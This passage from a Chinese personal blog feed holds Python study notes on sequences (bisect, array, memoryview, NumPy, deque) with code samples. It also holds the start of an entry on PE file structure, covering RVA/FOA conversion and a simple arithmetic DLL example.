id="一个关于的谜题"><a class="markdownIt-Anchor" href="#一个关于的谜题"></a> 一个关于+=的谜题</h3><p>如果对一个元组中的列表使用+=运算</p><img src="/2022/03/20/python%E5%AD%A6%E4%B9%A0-2/image-20220319163622333.png" alt="image-20220319163622333" style="zoom: 67%;"><p>原理</p><img src="/2022/03/20/python%E5%AD%A6%E4%B9%A0-2/image-20220319163949271.png" alt="image-20220319163949271" style="zoom: 67%;"><p><strong>不要把可变对象放在元组里面。</strong></p><p><strong>增量赋值不是一个原子操作。我们刚才也看到了，它虽然抛出了异常，但还是完成了操作。</strong></p><p><strong>查看 Python 的字节码并不难，而且它对我们了解代码背后的运行机 制很有帮助。</strong></p><h3 id="什么是原子操作"><a class="markdownIt-Anchor" href="#什么是原子操作"></a> 什么是原子操作？</h3><p>原子操作（<strong>atomic operation</strong>），指不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会切换到其他线程。</p><p>它有点类似数据库中的 <strong>事务</strong>。</p><h2 id="27-listsort方法和内置函数sorted"><a class="markdownIt-Anchor" href="#27-listsort方法和内置函数sorted"></a> 2.7 list.sort方法和内置函数sorted</h2><p><strong>list.sort 方法会就地排序列表，也就是说不会把原列表复制一份,返回值是 None。</strong></p><p>不管是 list.sort 方法还是 sorted 函数，都有两个可选的关键字参数。</p><p><strong>reverse</strong> 如果被设定为 True，被排序的序列里的元素会以降序输出（也就 是说把最大值当作最小值来排序）。这个参数的默认值是 False。</p><p><strong>key</strong> 一个只有一个参数的函数，这个函数会被用在序列里的每一个元素 上，所产生的结果将是排序算法依赖的对比关键字。比如说，在对一些 字符串排序时，可以用 key=str.lower 来实现忽略大小写的排序，或 者是用 key=len 进行基于字符串长度的排序。这个参数的默认值是恒 等函数（identity function），也就是默认用元素自己的值来排序。</p><p>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">fruits = [<span class="hljs-string">&#x27;grape&#x27;</span>, <span class="hljs-string">&#x27;raspberry&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>]<br><span class="hljs-built_in">sorted</span>(fruits)<br><span class="hljs-built_in">print</span>(fruits) <span class="hljs-comment">#[&#x27;grape&#x27;, &#x27;raspberry&#x27;, &#x27;apple&#x27;, &#x27;banana&#x27;]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sorted</span>(fruits)) <span class="hljs-comment">#[&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;grape&#x27;, &#x27;raspberry&#x27;]</span><br><span class="hljs-built_in">print</span>( <span class="hljs-built_in">sorted</span>(fruits, reverse=<span class="hljs-literal">True</span>) )<span class="hljs-comment">#[&#x27;raspberry&#x27;, &#x27;grape&#x27;, &#x27;banana&#x27;, &#x27;apple&#x27;]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sorted</span>(fruits, key=<span class="hljs-built_in">len</span>, reverse=<span class="hljs-literal">True</span>))<span class="hljs-comment">#[&#x27;raspberry&#x27;, &#x27;banana&#x27;, &#x27;grape&#x27;, &#x27;apple&#x27;]</span><br><span class="hljs-built_in">print</span>(fruits.sort())<span class="hljs-comment">#None</span><br><span class="hljs-built_in">print</span>(fruits)<span class="hljs-comment">#[&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;grape&#x27;, &#x27;raspberry&#x27;]</span><br></code></pre></td></tr></table></figure><h2 id="28-用bisect来管理已排序的序列"><a class="markdownIt-Anchor" href="#28-用bisect来管理已排序的序列"></a> 2.8 用bisect来管理已排序的序列</h2><h3 id="书里的解释"><a class="markdownIt-Anchor" href="#书里的解释"></a> <strong>书里的解释：</strong></h3><p>bisect(haystack, needle) 在 haystack（干草垛）里搜索 needle（针）的位置，该位置满足的条件是，把 needle 插入这个位置 之后，haystack 还能保持升序。也就是在说这个函数返回的位置前面 的值，都小于或等于 needle 的值。其中 haystack 必须是一个有序的 序列。你可以先用 bisect(haystack, needle) 查找位置 index，再用 haystack.insert(index, needle) 来插入新值。但你也可用 insort 来一步到位，并且后者的速度更快一些</p><h3 id="示例代码"><a class="markdownIt-Anchor" href="#示例代码"></a> <strong>示例代码：</strong></h3><p>偷了那里<a href="https://blog.csdn.net/Linux_liuge/article/details/94959106">(11条消息) 关于python中‘bisect管理已排序序列’记_runner-liu的博客-CSDN博客</a>的解释，有修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># BEGIN BISECT_DEMO</span><br><span class="hljs-keyword">import</span> bisect<br><span class="hljs-keyword">import</span> sys<br><br>num_hay = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">19</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">35</span>]   <span class="hljs-comment"># 定义被插入数列</span><br>num_need = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>, <span class="hljs-number">23</span>, <span class="hljs-number">38</span>]  <span class="hljs-comment"># 定义插入数列的数列</span><br>row_fmt = <span class="hljs-string">&#x27;&#123;0:2d&#125; @ &#123;1:2d&#125;    &#123;2&#125;&#123;0:&lt;2d&#125;&#x27;</span>   <span class="hljs-comment"># 定义数据显示格式 0，1，2对应needle, position, offset</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">^, &lt;, &gt; 分别是居中、左对齐、右对齐，后面带宽度， : 号后面带填充的字符，只能是一个字符，不指定则默认是用空格填充。</span><br><span class="hljs-string">+ 表示在正数前显示 +，负数前显示 -；  （空格）表示在正数前加空格</span><br><span class="hljs-string">b、d、o、x 分别是二进制、十进制、八进制、十六进制。</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">demo</span>(<span class="hljs-params">bisect_fn</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;定义测试bisect的函数&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> needle <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(num_need):   <span class="hljs-comment"># reversed() 返回一个反转的迭代器即将数列倒序。只能进行一次循环遍历。显示一次所包含的值</span><br>        position = bisect_fn(num_hay, needle)   <span class="hljs-comment"># 使用bisect(haystack, needle)函数查询指针位置（第1个数之前为0，第1个数之后为1，第2个数之后为2 ）</span><br>        offset = position * <span class="hljs-string">&#x27;  |&#x27;</span>   <span class="hljs-comment"># 通过 pisition 计算制表需要的 “  |” 数</span><br>        <span class="hljs-built_in">print</span>(row_fmt.<span class="hljs-built_in">format</span>(needle, position, offset))     <span class="hljs-comment"># 将数据填入定义好的数据显示格式（row_fmt）中</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;left&#x27;</span>:   <span class="hljs-comment"># 执行脚本文件时，python3 脚本文件名 left  即定义数值从位置左侧插入</span><br>        bisect_fn_1 = bisect.bisect_left<br>    <span class="hljs-keyword">else</span>:<br>        bisect_fn_1 = bisect.bisect     <span class="hljs-comment"># bisect.bisect 实际上就是bisect.bisect_right 前者是别名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DEMO:&#x27;</span>, bisect_fn_1.__name__)    <span class="hljs-comment"># 打印上面判断的函数名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;haystack -&gt;&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-string">&#x27;%2d&#x27;</span> % n <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> num_hay))      <span class="hljs-comment"># str.join()通过指定字符连接序列中元素后生成的新字符串。str为指定字符</span><br>    demo(bisect_fn_1)   <span class="hljs-comment"># 调用函数demo</span><br> <br><span class="hljs-comment"># END BISECT_DEMO</span><br></code></pre></td></tr></table></figure><p><strong>实际效果:left和right</strong></p><p><strong>left是往相同数据的左边插入，right是右边</strong></p><p><img src="/2022/03/20/python%E5%AD%A6%E4%B9%A0-2/image-20220319201443565.png" alt="image-20220319201443565"></p><h3 id="可以用来建立索引"><a class="markdownIt-Anchor" href="#可以用来建立索引"></a> 可以用来建立索引</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog">#根据一个分数查询成绩<br>def greae(score,breakpoints=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>],grades=<span class="hljs-string">&#x27;abcdef&#x27;</span>):<br>    i = bisect.bisect(breakpoints,score)<br>    print(grades[i])<br>    return grades[i]<br><br>print([greae(score) for score in [<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">55</span>,<span class="hljs-number">44</span>,<span class="hljs-number">33</span>]])<br>#[<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>]<br><br></code></pre></td></tr></table></figure><h3 id="用bisectinsort插入新元素"><a class="markdownIt-Anchor" href="#用bisectinsort插入新元素"></a> 用bisect.insort插入新元素</h3><p>**作用：**insort(seq, item) 把变量 item 插入到序列 seq 中，并能保持 seq 的升序顺序。</p><p>insort 跟 bisect 一样，有 lo 和 hi 两个可选参数用来控制查找的范围。它也有个变体叫 insort_left，这个变体在背后用的是 bisect_left。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">SIZE=<span class="hljs-number">7</span><br>random.seed(<span class="hljs-number">1729</span>)<span class="hljs-comment"># 用了随机种子</span><br>my_list = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(SIZE):<br>    new_item = random.randrange(SIZE*<span class="hljs-number">2</span>)<br>    bisect.insort(my_list, new_item)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%2d -&gt;&#x27;</span> % new_item, my_list)<br>    <br> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> 用了随机种子，所以必定是这个列表</span><br><span class="hljs-string"> 10 -&gt; [10]</span><br><span class="hljs-string"> 0 -&gt; [0, 10]</span><br><span class="hljs-string"> 6 -&gt; [0, 6, 10]</span><br><span class="hljs-string"> 8 -&gt; [0, 6, 8, 10]</span><br><span class="hljs-string"> 7 -&gt; [0, 6, 7, 8, 10]</span><br><span class="hljs-string"> 2 -&gt; [0, 2, 6, 7, 8, 10]</span><br><span class="hljs-string">10 -&gt; [0, 2, 6, 7, 8, 10, 10]</span><br><span class="hljs-string"> &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="29-列表不是首选时"><a class="markdownIt-Anchor" href="#29-列表不是首选时"></a> 2.9 列表不是首选时</h2><h2 id="291数组"><a class="markdownIt-Anchor" href="#291数组"></a> 2.9.1数组</h2><p>如果我们需要一个只包含数字的列表，那么 array.array 比 list 更 高效。数组支持所有跟可变序列有关的操作，包括 .pop、.insert 和 .extend。另外，数组还提供从文件读取和存入文件的更快的方法，如 .frombytes 和 .tofile。</p><img src="/2022/03/20/python%E5%AD%A6%E4%B9%A0-2/image-20220319211831384.png" alt="image-20220319211831384" style="zoom:67%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> array <span class="hljs-keyword">import</span> array<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> random<br><br>floats = array(<span class="hljs-string">&#x27;d&#x27;</span>,(random() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>**<span class="hljs-number">7</span>))) <span class="hljs-comment">#双精度浮点数组（类型码是 &#x27;d&#x27;），生成10000000个</span><br><span class="hljs-built_in">print</span> (<span class="hljs-built_in">len</span>(floats),floats[-<span class="hljs-number">1</span>])<br><span class="hljs-comment">#print (random())</span><br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;floats.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>floats.tofile(fp)<br>fp.close()<br>floats2 = array(<span class="hljs-string">&#x27;d&#x27;</span>)<br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;floats.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>floats2.fromfile(fp,<span class="hljs-number">10</span>**<span class="hljs-number">7</span>)<br><span class="hljs-built_in">print</span>(floats2[-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(floats == floats)<br>fp.close()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">10000000 0.9887800460985485</span><br><span class="hljs-string">0.9887800460985485</span><br><span class="hljs-string">True</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>说明array.tofile 和 array.fromfile 用于读取和写入二进制文件非常快</strong></p><p><strong>列表和数组的属性和方法</strong>：这个用了再参考吧</p><h2 id="292-内存视图"><a class="markdownIt-Anchor" href="#292-内存视图"></a> 2.9.2 内存视图</h2><p>memoryview 是一个内置类，它能让用户在不复制内容的情况下操作同 一个数组的不同切片。</p><p>例子：</p><p>试了试改书里的代码，我觉得这个更直观体现了</p><p><strong>1.memoryview只取内存，不是重新生成的对象，可以修改其内容</strong></p><p><strong>2.memv_oct[7] = 0xc 把高位修改成了1100，所以值变成了3073</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">numbers = array(<span class="hljs-string">&#x27;h&#x27;</span>,[-<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>])<span class="hljs-comment">#h对应c类型signed short</span><br>memv = <span class="hljs-built_in">memoryview</span>(numbers)<br><span class="hljs-built_in">print</span> (memv.tolist())<br><span class="hljs-comment">#[-2, -1, 0, 1, 2]</span><br>memv_oct = memv.cast(<span class="hljs-string">&#x27;B&#x27;</span>) <span class="hljs-comment">#是把 memv 里的内容转换成 &#x27;B&#x27; 类型(无符号字符)</span><br><span class="hljs-built_in">print</span>(memv_oct.tolist())<br><span class="hljs-comment">#[254, 255, 255, 255, 0, 0, 1, 0, 2, 0]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(memv[<span class="hljs-number">3</span>])) <span class="hljs-comment">#0b1</span><br>memv_oct[<span class="hljs-number">7</span>] = <span class="hljs-number">0xc</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(<span class="hljs-number">3073</span>)) <span class="hljs-comment">#0b110000000001</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(memv[<span class="hljs-number">3</span>])) <span class="hljs-comment">#0b110000000001</span><br><span class="hljs-built_in">print</span>(numbers) <span class="hljs-comment">#array(&#x27;h&#x27;, [-2, -1, 0, 3073, 2])</span><br></code></pre></td></tr></table></figure><h2 id="293-numpy和scipy"><a class="markdownIt-Anchor" href="#293-numpy和scipy"></a> 2.9.3 NumPy和SciPy</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy<br><br>a = numpy.arange(<span class="hljs-number">12</span>)<br><br><span class="hljs-built_in">print</span>(a) <span class="hljs-comment"># [ 0  1  2  3  4  5  6  7  8  9 10 11] </span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a))<br><span class="hljs-built_in">print</span>(a.shape) <span class="hljs-comment">#查看数组维度，显示(12,)表示1维，12个元素的数组</span><br>a.shape = <span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-comment">#把a分成3行4列的数组</span><br><span class="hljs-built_in">print</span>(a)                                                                                                     <br><span class="hljs-built_in">print</span>(a[<span class="hljs-number">2</span>]) <span class="hljs-comment">#打印第二行</span><br><span class="hljs-built_in">print</span>(a[<span class="hljs-number">2</span>,<span class="hljs-number">1</span>]) <span class="hljs-comment">#打印第二行第一列</span><br><span class="hljs-built_in">print</span>(a[:,<span class="hljs-number">1</span>]) <span class="hljs-comment">#打印每行的第一列</span><br><span class="hljs-built_in">print</span>(a.transpose()) <span class="hljs-comment">#行和列交换</span><br><br><span class="hljs-comment">#输出</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;class &#x27;numpy.ndarray&#x27;&gt;</span><br><span class="hljs-string">(12,)</span><br><span class="hljs-string">[[ 0  1  2  3]</span><br><span class="hljs-string"> [ 4  5  6  7]</span><br><span class="hljs-string"> [ 8  9 10 11]]</span><br><span class="hljs-string">[ 8  9 10 11]</span><br><span class="hljs-string">9</span><br><span class="hljs-string">[1 5 9]</span><br><span class="hljs-string">[[ 0  4  8]</span><br><span class="hljs-string"> [ 1  5  9]</span><br><span class="hljs-string"> [ 2  6 10]</span><br><span class="hljs-string"> [ 3  7 11]]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="294-双向队列和其他形式的队列"><a class="markdownIt-Anchor" href="#294-双向队列和其他形式的队列"></a> 2.9.4 双向队列和其他形式的队列</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#双向队列和其他形式的队列</span><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br>dq = deque(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>), maxlen=<span class="hljs-number">10</span>) <br><span class="hljs-built_in">print</span>(dq) <span class="hljs-comment">#deque([0, 1, 2, 3, 4, 5, 6, 7, 8, 9], maxlen=10)</span><br>dq.rotate(<span class="hljs-number">3</span>) <span class="hljs-comment"># 队列的旋转操作接受一个参数 n，当 n &gt; 0 时，队列的最右边的 n个元素会被移动到队列的左边。当 n &lt; 0 时，最左边的 n 个元素会被移动到右边。</span><br><span class="hljs-built_in">print</span>(dq)<br>dq.rotate(-<span class="hljs-number">4</span>) <br><span class="hljs-built_in">print</span>(dq)<br>dq.appendleft(-<span class="hljs-number">1</span>) <span class="hljs-comment">#的队列做尾部添加操作的时候，它头部的元素会被删除掉。deque([-1, 1, 2, 3, 4, 5, 6, 7, 8, 9], maxlen=10)</span><br><span class="hljs-built_in">print</span>(dq)<br>dq.appendleft(<span class="hljs-number">2</span>) <span class="hljs-comment">#deque([2, -1, 1, 2, 3, 4, 5, 6, 7, 8], maxlen=10)</span><br><span class="hljs-built_in">print</span>(dq)<br>dq.extend([<span class="hljs-number">11</span>,<span class="hljs-number">22</span>,<span class="hljs-number">33</span>])<span class="hljs-comment">#在队列尾部添加多个元素</span><br><span class="hljs-comment">#deque([2, 3, 4, 5, 6, 7, 8, 11, 22, 33], maxlen=10)</span><br><span class="hljs-built_in">print</span>(dq)<br>dq.extendleft([-<span class="hljs-number">1</span>,-<span class="hljs-number">2</span>,-<span class="hljs-number">3</span>])<span class="hljs-comment">#在队列开始逐个添加 extendleft(iter) 方法会把迭代器里的元素逐个添加到双向队列的左边，因此迭代器里的元素会逆序出现在队列里。</span><br><span class="hljs-comment">#deque([-3, -2, -1, 2, 3, 4, 5, 6, 7, 8], maxlen=10)</span><br><span class="hljs-built_in">print</span>(dq)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">双向队列实现了大部分列表所拥有的方法，也有一些额外的符合自身设</span><br><span class="hljs-string">计的方法，比如说 popleft 和 rotate。但是为了实现这些方法，双向</span><br><span class="hljs-string">队列也付出了一些代价，从队列中间删除元素的操作会慢一些，因为它</span><br><span class="hljs-string">只对在头尾的操作进行了优化。</span><br><span class="hljs-string">append 和 popleft 都是原子操作，也就说是 deque 可以在多线程程序</span><br><span class="hljs-string">中安全地当作先进先出的栈使用，而使用者不需要担心资源锁的问题。</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>除了 deque 之外，还有些其他的 Python 标准库也有对队列的实现。</p><p><strong>queue</strong> 提供了同步（线程安全）类 Queue、LifoQueue 和 PriorityQueue，不同的线程可以利用这些数据类型来交换信息。这三 个类的构造方法都有一个可选参数 maxsize，它接收正整数作为输入 值，用来限定队列的大小。但是在满员的时候，这些类不会扔掉旧的元 素来腾出位置。相反，如果队列满了，它就会被锁住，直到另外的线程 移除了某个元素而腾出了位置。这一特性让这些类很适合用来控制活跃 线程的数量。</p><p><strong>multiprocessing</strong> 这个包实现了自己的 Queue，它跟 queue.Queue 类似，是设计给 进程间通信用的。同时还有一个专门的 multiprocessing.JoinableQueue 类型，可以让任务管理变得更方 便。</p><p><strong>asyncio</strong> ,Python 3.4 新提供的包，里面有 Queue、LifoQueue、PriorityQueue 和 JoinableQueue，这些类受 到 queue 和 multiprocessing 模块的影响，但是为异步编程里的任务 管理提供了专门的便利。 heapq 跟上面三个模块不同的是，heapq 没有队列类，而是提供了 heappush 和 heappop 方法，让用户可以把可变序列当作堆队列或者优 先队列来使用。</p>]]></content>
    
    
    <categories>
      
      <category>python学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构学习-2</title>
    <link href="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/"/>
    <url>/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/</url>
    
    <content type="html"><![CDATA[<h1 id="rva转foa的过程"><a class="markdownIt-Anchor" href="#rva转foa的过程"></a> Rva转Foa的过程</h1><p>1.判断Rva减去imagebase对比sizeofheader的大小，如果比这个小，那说明这个Rva减去imagebase对比sizeofheader就是foa</p><p>2.如果上述不成立，则遍历节表的virtualaddress，看位于哪2个节表之间，判断成功后用节表的pointtoraw+rva-virtualaddress，就是得到的foa</p><h2 id="foa转rva"><a class="markdownIt-Anchor" href="#foa转rva"></a> foa转rva</h2><p>反过来就行，先看这个foa在那个节，计算与这个节pointtoraw地址的偏移，然后加上这个节的virtualaddress</p><p>代码待补充</p><h1 id="动态链接库测试"><a class="markdownIt-Anchor" href="#动态链接库测试"></a> 动态链接库测试</h1><h2 id="隐式链接"><a class="markdownIt-Anchor" href="#隐式链接"></a> 隐式链接</h2><p>vs创建dll项目,pch.cpp和pch.h如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// pch.cpp: 与预编译标头对应的源文件</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-comment">// 当使用预编译的头时，需要使用此源文件，编译才能成功。</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">Plus</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> x + y;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">Sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> x - y;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">Mul</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> x * y;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">Div</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> x / y;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// pch.h: 这是预编译标头文件。</span><br><span class="hljs-comment">// 下方列出的文件仅编译一次，提高了将来生成的生成性能。</span><br><span class="hljs-comment">// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。</span><br><span class="hljs-comment">// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。</span><br><span class="hljs-comment">// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">int</span> _declspec(dllexport) <span class="hljs-function">__stdcall  <span class="hljs-title">Plus</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> 